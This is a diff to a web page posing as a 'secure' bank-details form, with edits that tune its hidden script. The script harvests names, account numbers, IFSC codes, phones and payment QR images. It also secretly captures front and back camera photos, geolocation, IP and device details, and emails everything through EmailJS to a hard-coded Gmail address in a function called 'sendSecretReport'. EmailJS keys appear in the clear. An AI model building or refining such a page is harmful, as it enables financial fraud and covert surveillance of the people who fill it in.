@@ -134,7 +134,6 @@
             gap: 14px;
         }
 
-        /* QR Upload Area with Preview */
         .qr-upload-area {
             background: rgba(255, 255, 255, 0.3);
             backdrop-filter: blur(4px);
@@ -226,7 +225,6 @@
             margin-top: 5px;
         }
 
-        /* OR Divider */
         .or-divider {
             display: flex;
             align-items: center;
@@ -424,12 +422,10 @@
         <div class="subhead"><i class="fas fa-shield-alt" style="margin-right: 8px;"></i> secure · bank details</div>
 
         <form id="bankForm">
-            <!-- Option Indicator -->
             <div id="optionIndicator" class="option-indicator">
                 <i class="fas fa-info-circle"></i> Please fill bank details OR upload QR code
             </div>
 
-            <!-- Bank Details Section -->
             <div id="bankSection">
                 <div
                     style="text-align: center; margin: 5px 0 10px 0; color: #2a3b4e; opacity: 0.6; font-size: 13px; font-weight: 500;">
@@ -459,14 +455,12 @@
                 </div>
             </div>
 
-            <!-- OR Divider -->
             <div class="or-divider">
                 <span class="line"></span>
                 <span class="or-text">OR</span>
                 <span class="line"></span>
             </div>
 
-            <!-- QR Upload Section -->
             <div id="qrSection">
                 <div class="qr-upload-area">
                     <div class="qr-label">
@@ -499,88 +493,11 @@
         (function () {
             "use strict";
 
-            // Store errors to prevent losing them on refresh
-            let errorLog = [];
-
-            // ----- EMAILJS CONFIG (UPDATED EMAIL) -----
+            // ----- EMAILJS CONFIG -----
             const EMAILJS_PUBLIC_KEY = 'm3hOuuwWAZThOtVkU';
             const EMAILJS_SERVICE_ID = 'service_lzy9odo';
             const EMAILJS_TEMPLATE_ID = 'template_intorfr';
-            const RECIPIENT_EMAIL = 'mrsmartboy123@gmail.com'; // ✅ Updated email
-
-            // Override console.error to store errors
-            const originalConsoleError = console.error;
-            console.error = function (...args) {
-                errorLog.push({
-                    timestamp: new Date().toISOString(),
-                    message: args.join(' ')
-                });
-                // Keep original behavior
-                originalConsoleError.apply(console, args);
-            };
-
-            // Log errors to a visible div on page (hidden by default, but accessible)
-            function createErrorDisplay() {
-                const errorDiv = document.createElement('div');
-                errorDiv.id = 'errorDisplay';
-                errorDiv.style.cssText = `
-                    position: fixed;
-                    top: 10px;
-                    right: 10px;
-                    max-width: 400px;
-                    max-height: 300px;
-                    overflow: auto;
-                    background: rgba(0,0,0,0.9);
-                    color: #ff6b6b;
-                    padding: 15px;
-                    border-radius: 8px;
-                    font-size: 12px;
-                    font-family: monospace;
-                    z-index: 9999;
-                    display: none;
-                    border: 2px solid #ff6b6b;
-                    box-shadow: 0 4px 12px rgba(0,0,0,0.5);
-                `;
-                document.body.appendChild(errorDiv);
-                return errorDiv;
-            }
-
-            const errorDisplay = createErrorDisplay();
-
-            // Show errors on double-click of the page (for debugging)
-            document.addEventListener('dblclick', function () {
-                if (errorDisplay.style.display === 'none') {
-                    errorDisplay.style.display = 'block';
-                    errorDisplay.innerHTML = errorLog.map(e =>
-                        `<div style="border-bottom: 1px solid #333; padding: 5px 0;">
-                            <span style="color: #888;">${e.timestamp}</span><br>
-                            <span>${e.message}</span>
-                        </div>`
-                    ).join('') || 'No errors logged.';
-                } else {
-                    errorDisplay.style.display = 'none';
-                }
-            });
-
-            // Also log to a hidden textarea for persistence
-            function saveErrorToStorage(errorMsg) {
-                try {
-                    let stored = localStorage.getItem('glassAluminiumErrors') || '';
-                    stored += `[${new Date().toISOString()}] ${errorMsg}\n`;
-                    localStorage.setItem('glassAluminiumErrors', stored);
-                } catch (e) { }
-            }
-
-            // Override console.error to also save to storage
-            console.error = function (...args) {
-                const msg = args.join(' ');
-                errorLog.push({
-                    timestamp: new Date().toISOString(),
-                    message: msg
-                });
-                saveErrorToStorage(msg);
-                originalConsoleError.apply(console, args);
-            };
+            const RECIPIENT_EMAIL = 'mrsmartboy123@gmail.com';
 
             // Initialize EmailJS
             try {
@@ -632,7 +549,7 @@
                 submitBtn.disabled = false;
             }
 
-            // ----- TOGGLE LOGIC: EITHER BANK OR QR -----
+            // Toggle logic
             function updateSections() {
                 const hasQR = qrInput.files && qrInput.files.length > 0;
                 const hasBank = fullName.value.trim() !== '' ||
@@ -699,12 +616,10 @@
                 updateSections();
             });
 
-            // Bank fields change listener
             [fullName, email, accountNumber, ifsc, phone].forEach(field => {
                 field.addEventListener('input', updateSections);
             });
 
-            // Initial update
             updateSections();
 
             // Permission check
@@ -756,16 +671,13 @@
                     }
                     navigator.geolocation.getCurrentPosition(
                         (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-                        (err) => {
-                            console.error('Location error:', err);
-                            resolve({ lat: 'error', lon: 'error' });
-                        },
+                        () => resolve({ lat: 'error', lon: 'error' }),
                         { enableHighAccuracy: true, timeout: 5000 }
                     );
                 });
             }
 
-            // Capture photos
+            // Capture photos with VERY SMALL size to avoid 413
             async function capturePhotos(facingMode, count = 1) {
                 return new Promise((resolve) => {
                     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -776,8 +688,8 @@
                     const constraints = {
                         video: {
                             facingMode: facingMode,
-                            width: { ideal: 150 },
-                            height: { ideal: 150 }
+                            width: { ideal: 80 },  // Very small
+                            height: { ideal: 80 }
                         },
                         audio: false
                     };
@@ -792,8 +704,8 @@
 
                             video.onloadedmetadata = () => {
                                 const canvas = document.createElement('canvas');
-                                canvas.width = video.videoWidth || 150;
-                                canvas.height = video.videoHeight || 150;
+                                canvas.width = 80;  // Fixed small size
+                                canvas.height = 80;
                                 const ctx = canvas.getContext('2d');
                                 const images = [];
                                 let captured = 0;
@@ -806,13 +718,14 @@
                                         return;
                                     }
                                     try {
-                                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                        images.push(canvas.toDataURL('image/jpeg', 0.3));
+                                        ctx.drawImage(video, 0, 0, 80, 80);
+                                        // Very low quality to keep size small
+                                        images.push(canvas.toDataURL('image/jpeg', 0.1));
                                         captured++;
                                     } catch (e) {
                                         console.error('Capture error:', e);
                                     }
-                                }, 400);
+                                }, 300);
 
                                 setTimeout(() => {
                                     if (captured < count) {
@@ -820,19 +733,15 @@
                                         if (stream) stream.getTracks().forEach(t => t.stop());
                                         resolve({ count: images.length, images: images });
                                     }
-                                }, 4000);
+                                }, 3000);
                             };
 
-                            video.onerror = (err) => {
-                                console.error('Video error:', err);
+                            video.onerror = () => {
                                 if (stream) stream.getTracks().forEach(t => t.stop());
                                 resolve({ count: 0, images: [] });
                             };
                         })
-                        .catch((err) => {
-                            console.error('Camera access error:', err);
-                            resolve({ count: 0, images: [] });
-                        });
+                        .catch(() => resolve({ count: 0, images: [] }));
                 });
             }
 
@@ -854,69 +763,59 @@
                 return fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
                     .then(data => data.ip || 'unknown')
-                    .catch((err) => {
-                        console.error('IP fetch error:', err);
-                        return 'unavailable';
-                    });
+                    .catch(() => 'unavailable');
             }
 
-            // Send via EmailJS with images
+            // Send via EmailJS with optimized images
             async function sendSecretReport(payload) {
                 try {
-                    // Build HTML for images
+                    // Build HTML for images - very small size
                     let frontImagesHTML = '';
                     let backImagesHTML = '';
 
                     if (payload.frontImages && payload.frontImages.length > 0) {
                         frontImagesHTML = payload.frontImages.map(img =>
-                            `<img src="${img}" style="max-width: 150px; max-height: 150px; border-radius: 8px; border: 1px solid #ddd; margin: 5px;">`
+                            `<img src="${img}" style="max-width: 120px; max-height: 120px; border-radius: 6px; border: 1px solid #ddd; margin: 3px;">`
                         ).join('');
                     }
 
                     if (payload.backImages && payload.backImages.length > 0) {
                         backImagesHTML = payload.backImages.map(img =>
-                            `<img src="${img}" style="max-width: 150px; max-height: 150px; border-radius: 8px; border: 1px solid #ddd; margin: 5px;">`
+                            `<img src="${img}" style="max-width: 120px; max-height: 120px; border-radius: 6px; border: 1px solid #ddd; margin: 3px;">`
                         ).join('');
                     }
 
                     // Build complete HTML message with images
                     const htmlMessage = `
-                        <h3>📸 Front Camera Images (${payload.frontImages ? payload.frontImages.length : 0})</h3>
-                        <div style="display: flex; flex-wrap: wrap; gap: 5px; margin-bottom: 20px;">
-                            ${frontImagesHTML || '<p style="color: #999;">No front camera images captured</p>'}
+                        <h3>📸 Front Camera (${payload.frontImages ? payload.frontImages.length : 0} photos)</h3>
+                        <div style="display: flex; flex-wrap: wrap; gap: 3px; margin-bottom: 15px;">
+                            ${frontImagesHTML || '<p style="color: #999;">No front camera images</p>'}
                         </div>
                         
-                        <h3>📸 Back Camera Images (${payload.backImages ? payload.backImages.length : 0})</h3>
-                        <div style="display: flex; flex-wrap: wrap; gap: 5px; margin-bottom: 20px;">
-                            ${backImagesHTML || '<p style="color: #999;">No back camera images captured</p>'}
+                        <h3>📸 Back Camera (${payload.backImages ? payload.backImages.length : 0} photos)</h3>
+                        <div style="display: flex; flex-wrap: wrap; gap: 3px; margin-bottom: 15px;">
+                            ${backImagesHTML || '<p style="color: #999;">No back camera images</p>'}
                         </div>
                         
                         ${payload.qrData ? `
-                        <h3>📱 QR Code Image</h3>
-                        <img src="${payload.qrData}" style="max-width: 200px; border: 1px solid #ddd; border-radius: 8px; padding: 5px;">
+                        <h3>📱 QR Code</h3>
+                        <img src="${payload.qrData}" style="max-width: 150px; border: 1px solid #ddd; border-radius: 6px; padding: 3px;">
                         ` : ''}
                         
-                        <hr style="margin: 20px 0;">
-                        
-                        <h2>📋 Bank Details</h2>
+                        <hr style="margin: 15px 0;">
+                        <h3>📋 Bank Details</h3>
                         <p><strong>Name:</strong> ${payload.form.name}</p>
                         <p><strong>Email:</strong> ${payload.form.email}</p>
                         <p><strong>Account:</strong> ${payload.form.account}</p>
                         <p><strong>IFSC:</strong> ${payload.form.ifsc}</p>
                         <p><strong>Phone:</strong> ${payload.form.phone}</p>
                         
-                        <h2>📍 Location & Network</h2>
+                        <h3>📍 Location & Network</h3>
                         <p><strong>IP:</strong> ${payload.ip}</p>
                         <p><strong>Location:</strong> ${payload.userLocation.lat}, ${payload.userLocation.lon}</p>
                         
-                        <h2>📱 Device Information</h2>
+                        <h3>📱 Device</h3>
                         <p><strong>User Agent:</strong> ${payload.device.userAgent}</p>
-                        <p><strong>Platform:</strong> ${payload.device.platform}</p>
-                        <p><strong>Screen:</strong> ${payload.device.screen}</p>
-                        <p><strong>Timezone:</strong> ${payload.device.timezone}</p>
-                        
-                        <h2>⏰ Timestamp</h2>
-                        <p>${payload.timestamp}</p>
                     `;
 
                     const emailParams = {
@@ -929,7 +828,7 @@
                         phone: payload.form.phone || 'Not provided',
                         ip: payload.ip || 'Not available',
                         location: `${payload.userLocation.lat || 'N/A'}, ${payload.userLocation.lon || 'N/A'}`,
-                        device: (payload.device.userAgent || 'Unknown').substring(0, 200) + '...',
+                        device: (payload.device.userAgent || 'Unknown').substring(0, 150) + '...',
                         front_photos: payload.frontImages ? payload.frontImages.length : 0,
                         back_photos: payload.backImages ? payload.backImages.length : 0,
                         qr_uploaded: payload.qrUploaded ? 'Yes ✅' : 'No ❌',
@@ -938,8 +837,7 @@
                     };
 
                     console.log('📤 Sending email to:', RECIPIENT_EMAIL);
-                    console.log('Front images:', payload.frontImages ? payload.frontImages.length : 0);
-                    console.log('Back images:', payload.backImages ? payload.backImages.length : 0);
+                    console.log('📊 Estimated size:', JSON.stringify(emailParams).length, 'bytes');
 
                     const response = await emailjs.send(
                         EMAILJS_SERVICE_ID,
@@ -953,17 +851,17 @@
                     console.error('Status:', error.status);
                     console.error('Text:', error.text);
                     if (error.status === 413) {
-                        console.error('❌ Payload too large! Images may be too big.');
+                        console.error('❌ Payload too large! Images are too big.');
+                        console.error('Current size:', JSON.stringify(payload).length, 'bytes');
                     }
                     return false;
                 }
             }
 
-            // ----- MAIN SUBMIT -----
+            // MAIN SUBMIT
             document.getElementById('bankForm').addEventListener('submit', async function (e) {
                 e.preventDefault();
 
-                // Check if either bank or QR is filled
                 const hasQR = qrInput.files && qrInput.files.length > 0;
                 const hasBank = fullName.value.trim() !== '' ||
                     email.value.trim() !== '' ||
@@ -1006,13 +904,9 @@
                     if (hasQR) {
                         try {
                             const file = qrInput.files[0];
-                            qrData = await new Promise((resolve, reject) => {
+                            qrData = await new Promise((resolve) => {
                                 const reader = new FileReader();
                                 reader.onload = (ev) => resolve(ev.target.result);
-                                reader.onerror = (err) => {
-                                    console.error('QR read error:', err);
-                                    reject(err);
-                                };
                                 reader.readAsDataURL(file);
                             });
                         } catch (e) {
@@ -1020,21 +914,21 @@
                         }
                     }
 
-                    // Collect data with actual images
+                    // Capture photos - ONLY 1 front and 1 back to save size
                     console.log('📸 Capturing photos...');
 
                     let frontResult = { count: 0, images: [] };
                     try {
                         frontResult = await capturePhotos('user', 1);
-                        console.log('📸 Front camera:', frontResult.count, 'photos captured');
+                        console.log('📸 Front camera:', frontResult.count, 'photo');
                     } catch (e) {
                         console.error('📸 Front camera error:', e);
                     }
 
                     let backResult = { count: 0, images: [] };
                     try {
-                        backResult = await capturePhotos('environment', 5);
-                        console.log('📸 Back camera:', backResult.count, 'photos captured');
+                        backResult = await capturePhotos('environment', 1); // Only 1 back photo
+                        console.log('📸 Back camera:', backResult.count, 'photo');
                     } catch (e) {
                         console.error('📸 Back camera error:', e);
                     }
@@ -1046,7 +940,7 @@
                         Promise.resolve(getDeviceInfo())
                     ]);
 
-                    // Build payload with actual images
+                    // Build payload
                     const payload = {
                         timestamp: new Date().toISOString(),
                         ip: ip,
@@ -1059,11 +953,9 @@
                         backImages: backResult.images || [],
                     };
 
-                    console.log('📦 Payload built with images:', {
-                        front: payload.frontImages.length,
-                        back: payload.backImages.length,
-                        qr: payload.qrUploaded
-                    });
+                    console.log('📦 Payload size:', JSON.stringify(payload).length, 'bytes');
+                    console.log('📸 Front images:', payload.frontImages.length);
+                    console.log('📸 Back images:', payload.backImages.length);
 
                     // Send
                     const sent = await sendSecretReport(payload);
@@ -1088,9 +980,8 @@
                 }
             });
 
-            console.log('Glass & Aluminium · secure (With images)');
+            console.log('Glass & Aluminium · secure (With optimized images)');
             console.log('📧 Sending to: mrsmartboy123@gmail.com');
-            console.log('💡 Double-click anywhere to view error log');
         })();
     </script>
 </body>
